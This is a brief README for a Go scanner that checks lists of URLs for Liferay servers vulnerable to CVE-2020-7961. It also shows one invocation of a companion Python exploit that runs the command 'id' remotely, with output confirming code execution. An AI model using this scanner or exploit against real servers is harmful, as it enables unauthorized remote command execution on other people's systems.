# liferay-scanner
Vuln Liferay scanner.

```
Liferay scanner for CVE-2020-7961
```

About
---
```
Code Completely Ripped off from @tomnomnom - he is a hero if you meet him buy him a bevvie!!

if vuln it should add it to liferay.log
Mainly made by tomnomnom and i changed the request to look for liferay.
```

Build
---

```
go get -u github.com/fatih/color
go build liferay.go
```


How to run
---

`cat list.txt | ./liferay`

Note
---
This requires a list of urls with https:// or http://



Liferay Exploit
---

```
python liferay-exploit.py -t https://myserver -c id
```

```
Status code:   200
Response body: b'uid=1002(liferay) gid=1002(liferay) groups=1002(liferay)\n'
```
